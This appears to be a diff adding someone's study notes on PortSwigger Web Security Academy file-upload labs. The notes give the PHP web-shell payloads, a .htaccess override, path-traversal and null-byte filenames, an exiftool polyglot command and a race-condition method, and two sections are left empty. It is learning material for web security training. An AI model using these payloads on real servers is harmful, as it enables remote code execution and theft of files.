@@ -1,0 +1,68 @@
+File upload vulnerabilities
+
+https://portswigger.net/web-security/file-upload
+
+
+
+
+
+
+Exploiting unrestricted file uploads to deploy a web shell
+	Remote code execution via web shell upload
+		Upload php shell with content - "<?php echo file_get_contents('/path/to/target/file'); ?>". then inspect image icon to view image locatioan'
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+Exploiting flawed validation of file uploads
+	Web shell upload via Content-Type restriction bypass
+		intercept requst while uploading php file. change Content-Type from "application/x-php" to "image/jpeg" and send requst.
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+Preventing file execution in user-accessible directories
+	Web shell upload via path traversal
+		Intercept request while uploading php file. change filename to "filename="%2e%2e%2fexploit.php". it is "../exploit.php". and send request
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+Overriding the server configuration
+	Web shell upload via extension blacklist bypass
+		First upload .htaccess file, which allow to execute php5 code. change filename to "filename=".htaccess"" with payload :
+		"<FilesMatch "(?i)\.(php5|php4|php|php3|php2|phtml|pl|py|jsp|asp|htm|shtml|sh|cgi)$">
+    ForceType application/x-httpd-php
+</FilesMatch>"
+		then upload php file with php5 extension which is allowed.
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+Obfuscating file extensions
+	Web shell upload via obfuscated file extension
+		Upload php file and intercept request. change filename to exploit.php%00.png. this allow to upload php file because low lewel program language is used in server side.
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+Flawed validation of the file's contents
+	Remote code execution via polyglot web shell upload
+		Use exiftool - "exiftool -Comment="<?php echo  file_get_contents('/home/carlos/secret')  ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+		this generate polyglot.php with image hex and content.
+		Also we can add JPEG/PNG/Gif hex headers into our php file. Tested and worked Gif hex "47 49 46 38 37 61" . used Ghex tool to insert hexes
+		xxd tool to view hexes
+		
+---------------------------------------------------------------------------------------------------------------------------------------------------	
+
+
+Exploiting file upload race conditions
+	Web shell upload via race condition
+		File is uploaded on the server and then checked if file is malware. at this point we can send tons of GET request on the location where file is uploaded with POST requests where we try to upload our exploit file. our upload file is deleted in miliseconds so we need to do it as fast as we can. send GET requests where we try to open our uploaded file into TURBO intruder. in turbo intuder also add POST request where we try tu upload our exploit file. add like - request1 = ''' {burp POST request } '''. than make for loop and add request1 into that loop like - "engine.queue(request1)" along with "engine.queue(target.req )" which is GET request. then launch attack and wait to 200 status code. it means that we found and exploit our updated file into server.
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+Race conditions in URL-based file uploads
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+Uploading files using PUT
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+-
